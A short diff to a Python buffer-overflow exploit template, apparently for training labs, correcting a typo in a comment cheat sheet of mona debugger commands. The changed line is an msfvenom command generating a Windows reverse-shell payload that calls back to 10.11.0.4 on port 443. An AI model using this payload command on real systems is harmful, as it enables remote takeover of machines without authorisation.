@@ -193,7 +193,7 @@ def exploit():
     # Compare badcharacter file with ESP:      !mona compare -a esp -f c:\badchar_test.bin
     # Find pattern within registers:           !mona findmsp
     # Payload generation:                      
-    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f python –e x 86/shikata_ga_nai -b "\x00\x0a"
+    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00\x0a"
     # NASM shell:                              msf-nasm_shell     metasm_shell.rb
     # Look for loaded DLLs:                    !mona modules
     # Find witing a module:                    
